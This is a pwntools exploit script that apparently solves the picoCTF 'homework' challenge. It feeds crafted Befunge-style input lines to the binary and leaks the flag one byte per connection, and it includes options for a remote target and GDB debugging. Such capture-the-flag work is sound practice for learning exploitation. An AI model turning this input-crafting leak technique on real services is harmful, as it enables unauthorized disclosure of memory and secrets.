from pwn import *
import string

elf = ELF('homework')
context.arch = elf.arch
context.binary = elf

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			# "b *main+364",
			"b *main+373",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("mars.picoctf.net", 31689)
	else:
		return process(elf.path, env=env)

leak = ""
for i in range(103):
	if '}' in leak:
		break
	with get_conn() as p:
		r = lambda x: p.recv(x)
		ra = lambda: p.recvall()
		rl = lambda: p.recvline(keepends=True)
		ru = lambda x: p.recvuntil(x, drop=True)
		s = lambda x, y: p.send(x, y)
		sa = lambda x, y: p.sendafter(x, y)
		sl = lambda x: p.sendline(x)
		sla = lambda x, y: p.sendlineafter(x, y, timeout=2)
		ia = lambda: p.interactive()
		li = lambda s: log.info(s)
		lw = lambda s: log.warn(s)
		cl = lambda: p.clean(timeout=3)

		moves = b'''
00!g00!0!+g00!0!+0!+v
\x7eX@,gg+!0!0!0g!0!0pg<
\x04\x32@@@@@@@@@@@@@@@@@@@
\x32@@@@@@@@@@@@@@@@@@@@
		'''

		moves = moves.replace(b'X', p8(0x34 + i))
		moves = list(filter(len, moves.strip().splitlines()))

		ru(b'Enter homework sol\n')
		for m in moves:
			sl(m)

		leak += r(1).strip().decode()
		print(leak)

